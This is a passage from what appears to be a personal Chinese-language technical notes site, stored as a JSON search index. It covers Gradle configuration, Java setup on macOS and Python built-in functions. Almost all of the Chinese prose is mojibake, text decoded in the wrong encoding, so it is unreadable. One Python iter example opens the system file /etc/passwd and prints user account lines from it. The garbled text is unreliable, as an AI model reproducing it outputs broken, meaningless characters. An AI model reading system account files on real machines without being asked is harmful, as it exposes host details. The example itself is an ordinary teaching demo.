è¿™æ˜¯Mavençš„ä¸­å¤®ä»“åº“ï¼Œæ— éœ€é…ç½®ï¼Œç›´æ¥å£°æ˜å°±å¯ä»¥ä½¿ç”¨ mavenCentral() // JCenterä¸­å¤®ä»“åº“ï¼Œå®é™…ä¹Ÿæ˜¯æ˜¯ç”¨çš„mavenæ­å»ºçš„ï¼Œä½†ç›¸æ¯”Mavenä»“åº“æ›´å‹å¥½ï¼Œé€šè¿‡CDNåˆ†å‘ï¼Œå¹¶ä¸”æ”¯æŒhttpsè®¿é—®ã€‚ // jcenter() } dependencies: ä¾èµ–å£°æ˜, å¦‚: // dependenciesé—­åŒ… ä¾èµ– // æ˜¯ç”¨äºå£°æ˜è¿™ä¸ªé¡¹ç›®ä¾èµ–äºå“ªäº›jar dependencies { implementation 'org.springframework.boot:spring-boot-starter-web' } gradle.properties å®šä¹‰ä¸€äº›æ‰§è¡Œçš„å±æ€§ è„šæœ¬ä½ç½®ä¸€èˆ¬åœ¨ $GRADLE_USER_HOME/ ç›®å½•ä¸‹. ä½†, æˆ‘çš„Macä¸ªäººç›®å½•ä¸‹æœ‰ä¸€ä¸ª .gradle , è¿™ä¸‹é¢æœ‰ä¸€ä¸ª, è²Œä¼¼æ˜¯å¦‚æœæ²¡è®¾ç½®, é»˜è®¤å°±æ˜¯è¿™ä¸ªç›®å½•? æš‚æ—¶è¿˜æ²¡çœ‹åˆ°æœ‰è¯´æ˜. å¯å‚è€ƒå®˜ç½‘æ–‡æ¡£: https://docs.gradle.org/current/userguide/build_environment.html init.gradle åˆå§‹åŒ–æ—¶æ‰§è¡Œçš„è„šæœ¬, è¯¦æƒ…å¯å‚è€ƒ: https://docs.gradle.org/current/userguide/init_scripts.html åˆ°è¿™é‡Œçš„æ—¶å€™, æƒ³èµ·å®‰è£…æ—¶å€™æœ‰çœ‹åˆ°è¯´è®¾ç½®ç¯å¢ƒå˜é‡ GRADLE_HOME , ç›®å‰ä¸ºæ­¢è²Œä¼¼æ²¡çœ‹åˆ°å®˜æ–¹æ–‡æ¡£æœ‰æåˆ°ç”¨å¤„ ä½¿ç”¨æ–¹å¼ å¯ä»¥é€šè¿‡å‘½ä»¤è¡Œå‚æ•° -I æˆ–è€… --init-script è·Ÿæ–‡ä»¶è·¯å¾„æ¥æŒ‡å®š, æ”¯æŒå¤šä¸ª, ä¹Ÿå¯ä»¥ç›´æ¥å°†å…¶æ–‡ä»¶æ”¾åœ¨ $GRADLE_USER_HOME/ ç›®å½•ä¸‹. (éœ€æå‰è®¾ç½®æ­¤ç¯å¢ƒå˜é‡) è‹¥æœ‰å¤šä¸ªæ–‡ä»¶, å¯ä»¥å°†å…¶å‘½ä»¤ä¸ºä»¥ .gradle ç»“å°¾çš„æ–‡ä»¶, ç„¶åæ”¾åˆ° $GRADLE_USER_HOME/init.d/ ç›®å½•ä¸‹. è„šæœ¬æ”¯æŒçš„å†…å®¹, å¦‚build.gradle: repositories { mavenCentral() } tasks.register('showRepos') { def repositoryNames = repositories.collect { it.name } doLast { println \"All repos:\" println repositoryNames } } è®¾ç½®æºå¤§æŠµä¹Ÿå¾—æ”¾åˆ°è¿™é‡Œ, ä¸è¿‡æˆ‘æœºå™¨ä½¿ç”¨å®˜æ–¹çš„æºä¹ŸæŒºå¿«, å°±æ²¡è®¾ç½®. å¦‚init.gradle: allprojects { repositories { mavenLocal() } } // å£°æ˜é¢å¤–ä¾èµ– initscript { repositories { mavenCentral() } dependencies { classpath 'org.apache.commons:commons-math:2.0' } } ä¹‹å‰å†²æµªçœ‹åˆ°æœ‰äººè¯´é«˜ç‰ˆæœ¬å·²ç»åºŸå¼ƒäº†allprojects, ä½†æ˜¯å®˜ç½‘æ–‡æ¡£è¿˜æœ‰è¿™ä¸ª... ç„¶åä½¿ç”¨å‘½ä»¤è¡Œå¯ä»¥è¿™ä¹ˆ: > gradle --init-script init.gradle -q showRepos All repos: [MavenLocal, MavenRepo] å·¥ä½œæµç¨‹ å·¥ä½œæµç¨‹: åˆå§‹åŒ–é˜¶æ®µ(é¦–å…ˆè§£æsettings.gradle) ==ã€‹ Configrationé˜¶æ®µ(è§£ææ¯ä¸ªProjectä¸­çš„build.gradleï¼Œè§£æè¿‡ç¨‹ä¸­å¹¶ä¸ä¼šæ‰§è¡Œå„ä¸ªbuild.gradleä¸­çš„task) ä¸€ä¸ª Project åŒ…å«å¾ˆå¤š Task, æ¯ä¸ª Task ä¹‹é—´æœ‰ä¾èµ–å…³ç³»","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-java-Build-tools-Gradle-Configuration-file-description.html","loc":"/yq-doc-source-docs-rear-end-java-Build-tools-Gradle-Configuration-file-description.html"},{"title":"ç›¸å…³ç¯å¢ƒå˜é‡è¯´æ˜","text":"","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-java-Build-tools-Gradle-Related-environment-variable-description.html","loc":"/yq-doc-source-docs-rear-end-java-Build-tools-Gradle-Related-environment-variable-description.html"},{"title":"Maven","text":"","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-java-Build-tools-maven.html","loc":"/yq-doc-source-docs-rear-end-java-Build-tools-maven.html"},{"title":"javaæ–‡ä»¶çš„ç¼–è¯‘æ‰§è¡Œ","text":"å¾ˆä¹…æ²¡ç”¨java, åœ¨vscodeé‡Œå†™æµ‹è¯•éƒ½å¿˜äº†ç±»åéœ€è¦ä¸æ–‡ä»¶åä¸€è‡´... ä»¥, test_run.java æ–‡ä»¶ä¸ºä¾‹. ç¼–è¯‘classæ–‡ä»¶, -dæŒ‡å®šè¾“å‡ºç›®å½•: javac -d __javacache__ test_run.java è¿è¡Œ, æ— éœ€classåç¼€, è‹¥è‡ªå®šä¹‰äº†è¾“å‡ºè·¯å¾„, éœ€è¦ä½¿ç”¨ -cp æŒ‡å®šæŸ¥æ‰¾è·¯å¾„: java -cp __javacache__ test_run","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-java-Compile-execution.html","loc":"/yq-doc-source-docs-rear-end-java-Compile-execution.html"},{"title":"IDEAé…ç½®Gradleé¡¹ç›®","text":"ä¸»è¦æ³¨æ„ç‰ˆæœ¬åŒ¹é…çš„é—®é¢˜, å¦‚: gradleä¸javaç‰ˆæœ¬ä¹‹é—´è¦å¯¹åº”","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-java-Idea-configuration-Gradle-project.html","loc":"/yq-doc-source-docs-rear-end-java-Idea-configuration-Gradle-project.html"},{"title":"Javaå®‰è£…é…ç½®","text":"å¯å®˜ç½‘ä¸‹è½½: https://www.oracle.com/cn/java/technologies/downloads/#java20 è§£å‹åéœ€è¦è®¾ç½®çš„ç¯å¢ƒå˜é‡: JAVA_HOME, å°±æ˜¯å®‰è£…ç›®å½• PATH, å°±æ˜¯ å®‰è£…ç›®å½•/bin. (å½“é”®ç›˜é”®å…¥javaæ—¶, ä¼šæ‰¾è¿™ä¸ªç›®å½•ä¸‹çš„java) ç‰¹æ®Šè¯´æ˜-Macä¸‹Javaå®‰è£…çš„è¯´æ˜ å½“å‰ç³»ç»Ÿ: MacOs13 ä½¿ç”¨Javaçš„æ—¶å€™å‘ç°ç³»ç»Ÿæœ‰ä¸€ä¸ªé»˜è®¤çš„ /usr/bin/java , æ— æ³•åˆ é™¤, æ®è¯´å³ä½¿æƒ³åŠæ³•åˆ æ‰å, é‡å¯åè¿˜ä¼šè‡ªå·±æ¢å¤. æ‰€ä»¥æœ€å¼€å§‹, æ˜¯ç›´æ¥æŠŠç¯å¢ƒå˜é‡çš„JAVA_HOMEå†™åˆ°æ‰€æœ‰ç¯å¢ƒå˜é‡çš„å‰é¢æ¥è§£å†³çš„. åé¢å¶ç„¶å‘ç°è¿™ä¸ªä¸æ˜¯ä¸»è¦åŸå› . ä»…ä»¥Macä¸‹çš„ /usr/bin/java æ¥è¯´æ˜, åŒç›®å½•ä¸‹çš„å…¶å®ƒæ–‡ä»¶å¯èƒ½ä¹Ÿæ˜¯è¿™ä¸ªåŸç†, è¿˜æ²¡æµ‹è¯•è¿‡... /usr/bin/java ä¼šé»˜è®¤å»æ‰¾ /Library/Java/JavaVirtualMachines ä¸‹é¢å®‰è£…å¥½çš„JDK, æ•…, è‹¥ä½¿ç”¨çš„æ˜¯å‹ç¼©åŒ…ä»€ä¹ˆçš„å®‰è£…åœ¨äº†å…¶å®ƒç›®å½•, éœ€è¦ç§»åŠ¨åˆ°è¿™ä¸ªç›®å½•ä¸‹é¢, æˆ–è€…è½¯é“¾æ¥è¿‡æ¥, æ¯”å¦‚æˆ‘ä¸‹è½½çš„JDK20è§£å‹åŒ…åœ¨ /usr/local/java/jdk-20.0.1.jdk , ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤é“¾æ¥: sudo ln -sn /usr/local/java/jdk-20.0.1.jdk /Library/Java/JavaVirtualMachines/jdk-20.0.1.jdk çœ‹ä¸€ä¸‹é“¾æ¥åçš„å†…å®¹: ls /Library/Java/JavaVirtualMachines jdk-20.0.1.jdk jdk1.8.0_311.jdk temurin-8.jdk æµ‹è¯•: /usr/bin/java --version java 20.0.1 2023-04-18 Java(TM) SE Runtime Environment (build 20.0.1+9-29) Java HotSpot(TM) 64-Bit Server VM (build 20.0.1+9-29, mixed mode, sharing) æ³¨è§£ Macæœ‰å†…ç½®çš„è·å–JAVA_HOMEçš„æŒ‡ä»¤: /usr/libexec/java_home Macä¸‹çš„å¸è½½ åŒç†, /usr/bin/java ä¸èƒ½è¢«åˆ é™¤, ä¸ç”¨ç®¡, ç›´æ¥æ›´æ–°ä¸€ä¸‹ profile é…ç½®çš„ç¯å¢ƒå˜é‡(çœ‹å½“åˆå®‰è£…é…ç½®çš„æ—¶å€™è®¾ç½®åœ¨å“ª), ç„¶ååˆ é™¤ /Library/Java/JavaVirtualMachines ä¸‹é¢ç›¸å…³ç‰ˆæœ¬å³å¯. è²Œä¼¼å¯ä»¥ä¸ç”¨åˆ ? çœ‹èµ·æ¥æ‰¾ç‰ˆæœ¬æ˜¯ä»é«˜åˆ°ä½çš„, è¿˜æ²¡è¯•è¿‡, ä¹‹å‰çš„ä¸¤ä¸ª11ç‰ˆæœ¬è¢«æˆ‘åˆ å®Œäº†, 1.8çš„è²Œä¼¼æ²¡æœ‰è¢«è‡ªåŠ¨è¯†åˆ«, ä»¥åæœ‰æœºä¼šåœ¨è¯•.","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-java-Install.html","loc":"/yq-doc-source-docs-rear-end-java-Install.html"},{"title":"ä¸€äº›å¤‡å¿˜","text":"MacOsæŸ¥çœ‹å®‰è£…è·¯å¾„: /usr/libexec/java_home -V Javaè¿è¡Œæ—¶ç¯å¢ƒï¼ˆJREï¼‰","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-java-Some-memo.html","loc":"/yq-doc-source-docs-rear-end-java-Some-memo.html"},{"title":"chr","text":"chr() ç”¨ä¸€ä¸ªèŒƒå›´åœ¨ rangeï¼ˆ256ï¼‰å†…çš„ï¼ˆå°±æ˜¯0ï½255ï¼‰æ•´æ•°ä½œå‚æ•°ï¼Œè¿”å›ä¸€ä¸ªå¯¹åº”çš„å­—ç¬¦ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-CHR.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-CHR.html"},{"title":"cmp","text":"æ³¨è§£ Python3 ä¸­å·²ç»ç§»é™¤, å¯ä»¥ä½¿ç”¨ operator æ¨¡å—: /docs/åç«¯/python/pythonæ ‡å‡†åº“/operator cmp(x,y) å‡½æ•°ç”¨äºæ¯”è¾ƒ2ä¸ªå¯¹è±¡ï¼Œå¦‚æœ x < y è¿”å› -1, å¦‚æœ x == y è¿”å› 0, å¦‚æœ x > y è¿”å› 1","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-CMP.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-CMP.html"},{"title":"dict","text":"ç”Ÿæˆä¸€ä¸ªå­—å…¸ æ”¯æŒå°†ä¸¤ä¸ªå€¼çš„è¿­ä»£è½¬æ¢ä¸ºå­—å…¸: In [1]: a = [(1, 2), (2, 3), (3, 4)] In [2]: dict(a) Out[2]: {1: 2, 2: 3, 3: 4} In [3]: dict(tuple(a)) Out[3]: {1: 2, 2: 3, 3: 4} In [4]: åˆå¹¶å¤šä¸ªå­—å…¸ è¿™é‡Œè¦æ³¨æ„ **å‚æ•°å…³é”®å­—å¿…é¡»æ˜¯å­—ç¬¦ä¸²: dict(dict1, **dict2, **dict3)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-DICT.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-DICT.html"},{"title":"filter","text":"filter() å‡½æ•°ç”¨äºè¿‡æ»¤åºåˆ—ï¼Œè¿‡æ»¤æ‰ä¸ç¬¦åˆæ¡ä»¶çš„å…ƒç´ ï¼Œè¿”å›ç”±ç¬¦åˆæ¡ä»¶å…ƒç´ ç»„æˆçš„æ–°åˆ—è¡¨ã€‚ Python2.7 è¿”å›åˆ—è¡¨ Python3.x è¿”å›è¿­ä»£å™¨å¯¹è±¡ è¿‡æ»¤å‡ºåˆ—è¡¨ä¸­çš„æ‰€æœ‰å¥‡æ•°: def is_odd(n): return n % 2 == 1 newlist = filter(is_odd, [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]) print(newlist)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-Filter.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-Filter.html"},{"title":"iter","text":"åˆ›å»ºä¸€ä¸ªè¿­ä»£å™¨ iter å‡½æ•°ä¸€ä¸ªé²œä¸ºäººçŸ¥çš„ç‰¹æ€§æ˜¯å®ƒæ¥å—ä¸€ä¸ªå¯é€‰çš„ callable å¯¹è±¡å’Œä¸€ä¸ªæ ‡è®° (ç»“ å°¾) å€¼ä½œä¸ºè¾“å…¥å‚æ•°ã€‚ å½“ä»¥è¿™ç§æ–¹å¼ä½¿ç”¨çš„æ—¶å€™ï¼Œå®ƒä¼šåˆ›å»ºä¸€ä¸ªè¿­ä»£å™¨ï¼Œè¿™ä¸ªè¿­ä»£å™¨ä¼š ä¸æ–­è°ƒç”¨ callable å¯¹è±¡ç›´åˆ°è¿”å›å€¼å’Œæ ‡è®°å€¼ç›¸ç­‰ä¸ºæ­¢ã€‚ ä¾‹: >>> import sys >>> f = open('/etc/passwd') >>> for chunk in iter(lambda: f.read(10), ''): ... n = sys.stdout.write(chunk) ... nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false root:*:0:0:System Administrator:/var/root:/bin/sh daemon:*:1:1:System Services:/var/root:/usr/bin/false _uucp:*:4:4:Unix to Unix Copy Protocol:/var/spool/uucp:/usr/sbin/uucico ... >>>","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-ITER.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-ITER.html"},{"title":"ord","text":"ord() å‡½æ•°æ˜¯ chr() å‡½æ•°ï¼ˆå¯¹äº8ä½çš„ASCIIå­—ç¬¦ä¸², è§ /docs/åç«¯/python/å†…ç½®å‡½æ•°/chr ï¼‰ æˆ– unichr() å‡½æ•°ï¼ˆå¯¹äºUnicodeå¯¹è±¡ï¼‰çš„é…å¯¹å‡½æ•°ï¼Œ å®ƒä»¥ä¸€ä¸ªå­—ç¬¦ï¼ˆé•¿åº¦ä¸º1çš„å­—ç¬¦ä¸²ï¼‰ä½œä¸ºå‚æ•°ï¼Œè¿”å›å¯¹åº”çš„ ASCII æ•°å€¼ï¼Œæˆ–è€… Unicode æ•°å€¼ï¼Œ å¦‚æœæ‰€ç»™çš„ Unicode å­—ç¬¦è¶…å‡ºäº†ä½ çš„ Python å®šä¹‰èŒƒå›´ï¼Œåˆ™ä¼šå¼•å‘ä¸€ä¸ª TypeError çš„å¼‚å¸¸ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-ORD.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-ORD.html"},{"title":"str/repr","text":"str ä¸ repr å‡½æ•°çš„æ•ˆæœå·®ä¸å¤š, æ‰€ä»¥å°±æ”¾åˆ°ä¸€èµ·è¯´äº†. å¯¹äºç»§æ‰¿äº† object çš„ç±»(æ–°å¼ç±»)è€Œè¨€, å¯ä»¥é€šè¿‡é‡å†™: __str__() __repr__() æ¥æ›´æ”¹é»˜è®¤è¡Œä¸º. ä¸€èˆ¬è€Œè¨€, repr ç”¨äº å¼€å‘/æµ‹è¯•, str ç”¨äºæ­£å¼åœºæ™¯ è‹¥æ²¡æœ‰å®šä¹‰ __str__ è€Œå®šä¹‰äº† __repr__ , åˆ™ä½¿ç”¨ str, ä¼šè°ƒç”¨ __repr__ å¯ä»¥çœ‹çœ‹é»˜è®¤çš„ä¾‹å­: In [7]: @dataclass ...: class MTest(object): ...: name: str ...: age: int ...: In [8]: m = MTest('tt', 12) In [9]: str(m) Out[9]: \"MTest(name='tt', age=12)\" In [10]: repr(m) Out[10]: \"MTest(name='tt', age=12)\" å¯ä»¥å‘ç°é»˜è®¤å®ç°çš„æ²¡æœ‰ä»€ä¹ˆå·®åˆ«. è¿™æ—¶å€™å¦‚æœéœ€è¦ä¸ä¸€è‡´, å°±éœ€è¦è‡ªå·±é‡å†™äº†... ç†æƒ³çš„æƒ…å†µ: In [14]: import datetime In [15]: d = datetime.datetime.now() In [16]: d Out[16]: datetime.datetime(2023, 4, 13, 9, 37, 55, 887361) In [17]: str(d) Out[17]: '2023-04-13 09:37:55.887361' In [18]: repr(d) Out[18]: 'datetime.datetime(2023, 4, 13, 9, 37, 55, 887361)'","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-Str,-REPR.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-Str,-REPR.html"},{"title":"type","text":"ä¸€ä¸ªå‚æ•° ä¸€ä¸ªå‚æ•°è¿”å›ç±»å‹ ä¸‰ä¸ªå‚æ•°(æˆ–è€…å¤§äº1) ä»¥ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºç±»å, ç¬¬äºŒä¸ªå‚æ•°ä¸ºçˆ¶ç±»å…ƒç¥–, ç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºèµ‹å€¼ ç”¨ä¾‹: # coding: utf-8 class A ( object ): a = 1 class B ( object ): b = 2 def something (): print ( 'some' ) c = type ( A ), type ( A ()) d = type ( 'D' , ( A , B ), { 'something' : something }) print ( 'ä¸€ä¸ªå‚æ•°' , c ) print ( 'ä¸‰ä¸ªå‚æ•°' , d , d . __dict__ , d . a , d . b ) # è¾“å‡º # ä¸€ä¸ªå‚æ•° (<class 'type'>, <class '__main__.A'>) # ä¸‰ä¸ªå‚æ•° <class '__main__.D'> {'something': <function something at 0x109e410d0>, '__module__': '__main__', '__doc__': None} 1 2","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-Type.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-Type.html"},{"title":"vars","text":"è·å–å±€éƒ¨å˜é‡è¡¨, æˆ–è€…å¯¹è±¡å±æ€§.","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-Vars.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-Vars.html"},{"title":"__str__","text":"å½“ä½¿ç”¨printè¾“å‡ºå¯¹è±¡çš„æ—¶å€™ï¼Œåªè¦è‡ªå·±å®šä¹‰äº† __str__(self) æ–¹æ³•ï¼Œé‚£ä¹ˆå°±ä¼šæ‰“å°ä»åœ¨è¿™ä¸ªæ–¹æ³•ä¸­returnçš„æ•°æ® æ¯”å¦‚: class Cat: def __str__(self): return \"çŒ«\" t = Cat() print(t) # çŒ«","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-__Str__.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-__Str__.html"},{"title":"any","text":"any() å‡½æ•°ç”¨äºåˆ¤æ–­ç»™å®šçš„å¯è¿­ä»£å‚æ•° iterable æ˜¯å¦å…¨éƒ¨ä¸º False å…ƒç´ é™¤äº†æ˜¯ 0ã€ç©ºã€FALSE å¤–éƒ½ç®— TRUEã€‚ å‡½æ•°ç­‰ä»·äº: def any(iterable): for element in iterable: if element: return True return False","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-any.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-any.html"},{"title":"async for","text":"å¼‚æ­¥è¿­ä»£å™¨. æ™®é€šå¯¹è±¡çš„forå¾ªç¯åªéœ€è¦å®ç° __iter__ å³å¯ å¯¹äº async forè€Œè¨€, è‹¥éœ€è¦æ”¯æŒ, éœ€è¦å®ç° __aiter__ è¿”å›ä¸€ä¸ªå¼‚æ­¥è¿­ä»£å™¨ï¼ˆasynchronous iteratorï¼‰å¯¹è±¡; è‹¥éœ€è¦å¯¹è±¡æœ¬èº«å°±æ˜¯ä¸€ä¸ªè¿­ä»£å™¨. è¿˜éœ€è¦å®ç° __anext__ , è¿”å›ä¸€ä¸ªawaitableç±»å‹çš„å€¼(å¼‚æ­¥è¿­ä»£å™¨å¯¹è±¡); ä¾‹: class AsyncIteratorWrapper: def __init__(self, obj): self._it = iter(obj) def __aiter__(self): return self async def __anext__(self): try: value = next(self._it) except StopIteration: raise StopAsyncIteration return value async for letter in AsyncIteratorWrapper(\"abc\"): print(letter)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-async_For.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-async_For.html"},{"title":"bytearray","text":"bytearray() æ–¹æ³•è¿”å›ä¸€ä¸ªæ–°å­—èŠ‚æ•°ç»„ã€‚è¿™ä¸ªæ•°ç»„é‡Œçš„å…ƒç´ æ˜¯å¯å˜çš„ï¼Œå¹¶ä¸”æ¯ä¸ªå…ƒç´ çš„å€¼èŒƒå›´: 0 <= x < 256ã€‚ bytearray() çš„ä½¿ç”¨æ–¹æ³•: >>>bytearray() bytearray(b'') >>> bytearray([1,2,3]) bytearray(b'\\x01\\x02\\x03') >>> bytearray('runoob', 'utf-8') bytearray(b'runoob') >>>","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-bytearray.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-bytearray.html"},{"title":"divmod","text":"python divmod() å‡½æ•°æŠŠé™¤æ•°å’Œä½™æ•°è¿ç®—ç»“æœç»“åˆèµ·æ¥ï¼Œè¿”å›ä¸€ä¸ªåŒ…å«å•†å’Œä½™æ•°çš„å…ƒç»„(a // b, a % b) ä¾‹: >>>divmod(7, 2) (3, 1) >>> divmod(8, 2) (4, 0) >>> divmod(1+2j,1+0.5j) ((1+0j), 1.5j)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-divmod.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-divmod.html"},{"title":"enumerate","text":"enumerate() å‡½æ•°è¿”å›çš„æ˜¯ä¸€ä¸ª enumerate å¯¹è±¡å®ä¾‹ï¼Œå®ƒæ˜¯ä¸€ä¸ªè¿­ä»£å™¨ï¼Œè¿”å›è¿ ç»­çš„åŒ…å«ä¸€ä¸ªè®¡æ•°å’Œä¸€ä¸ªå€¼çš„å…ƒç»„ï¼Œ å…ƒç»„ä¸­çš„å€¼é€šè¿‡åœ¨ä¼ å…¥åºåˆ—ä¸Šè°ƒç”¨ next() è¿”å›ã€‚ æ¥å—ä¸€ä¸ªå‚æ•°ä½œä¸ºèµ·å§‹åºå·, é»˜è®¤ä¸º0: >>> my_list = ['a', 'b', 'c'] >>> for idx, val in enumerate(my_list, 1): ... print(idx, val) ... 1a 2b 3c","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-enumerate.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-enumerate.html"},{"title":"format","text":"æœ‰ä¸ªåŠŸèƒ½æ˜¯å­—ç¬¦ä¸²å¯¹é½: format('ssd', '>20') Out[24]: ' ssd'","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-format.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-format.html"},{"title":"max","text":"max() å‡½æ•°è¿”å›æœ‰æœ€å¤§å€¼çš„é¡¹ç›®ï¼Œæˆ–è€… iterable ä¸­æœ‰æœ€å¤§å€¼çš„é¡¹ç›®ã€‚ å¦‚æœå€¼æ˜¯å­—ç¬¦ä¸²ï¼Œåˆ™æŒ‰å­—æ¯é¡ºåºè¿›è¡Œæ¯”è¾ƒã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-max.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-max.html"},{"title":"min","text":"min() å‡½æ•°è¿”å›å€¼æœ€å°çš„é¡¹ç›®ï¼Œæˆ– iterable ä¸­å€¼æœ€å°çš„é¡¹ç›®ã€‚ å¦‚æœå€¼æ˜¯å­—ç¬¦ä¸²ï¼Œåˆ™æŒ‰å­—æ¯é¡ºåºè¿›è¡Œæ¯”è¾ƒã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-min.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-min.html"},{"title":"open","text":"python open() å‡½æ•°ç”¨äºæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼Œåˆ›å»ºä¸€ä¸ª file å¯¹è±¡ï¼Œç›¸å…³çš„æ–¹æ³•æ‰å¯ä»¥è°ƒç”¨å®ƒè¿›è¡Œè¯»å†™ã€‚ ä¸åŒæ¨¡å¼æ‰“å¼€æ–‡ä»¶çš„å®Œå…¨åˆ—è¡¨ï¼š æ¨¡å¼ æè¿° t æ–‡æœ¬æ¨¡å¼ (é»˜è®¤)ã€‚ x å†™æ¨¡å¼ï¼Œæ–°å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œå¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨åˆ™ä¼šæŠ¥é”™ã€‚ b äºŒè¿›åˆ¶æ¨¡å¼ã€‚ æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶è¿›è¡Œæ›´æ–°(å¯è¯»å¯å†™)ã€‚ U é€šç”¨æ¢è¡Œæ¨¡å¼ï¼ˆä¸æ¨èï¼‰ã€‚ r ä»¥åªè¯»æ–¹å¼æ‰“å¼€æ–‡ä»¶ã€‚æ–‡ä»¶çš„æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„å¼€å¤´ã€‚è¿™æ˜¯é»˜è®¤æ¨¡å¼ã€‚ rb ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºåªè¯»ã€‚æ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„å¼€å¤´ã€‚è¿™æ˜¯é»˜è®¤æ¨¡å¼ã€‚ä¸€èˆ¬ç”¨äºéæ–‡æœ¬æ–‡ä»¶å¦‚å›¾ç‰‡ç­‰ã€‚ r+ æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¯»å†™ã€‚æ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„å¼€å¤´ã€‚ rb+ ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¯»å†™ã€‚æ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„å¼€å¤´ã€‚ä¸€èˆ¬ç”¨äºéæ–‡æœ¬æ–‡ä»¶å¦‚å›¾ç‰‡ç­‰ã€‚ w æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶åªç”¨äºå†™å…¥ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨åˆ™æ‰“å¼€æ–‡ä»¶ï¼Œå¹¶ä»å¼€å¤´å¼€å§‹ç¼–è¾‘ï¼Œå³åŸæœ‰å†…å®¹ä¼šè¢«åˆ é™¤ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ã€‚ wb ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶åªç”¨äºå†™å…¥ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨åˆ™æ‰“å¼€æ–‡ä»¶ï¼Œå¹¶ä»å¼€å¤´å¼€å§‹ç¼–è¾‘ï¼Œå³åŸæœ‰å†…å®¹ä¼šè¢«åˆ é™¤ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ã€‚ä¸€èˆ¬ç”¨äºéæ–‡æœ¬æ–‡ä»¶å¦‚å›¾ç‰‡ç­‰ã€‚ w+ æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¯»å†™ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨åˆ™æ‰“å¼€æ–‡ä»¶ï¼Œå¹¶ä»å¼€å¤´å¼€å§‹ç¼–è¾‘ï¼Œå³åŸæœ‰å†…å®¹ä¼šè¢«åˆ é™¤ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ã€‚ wb+ ä»¥äºŒè¿›åˆ¶æ 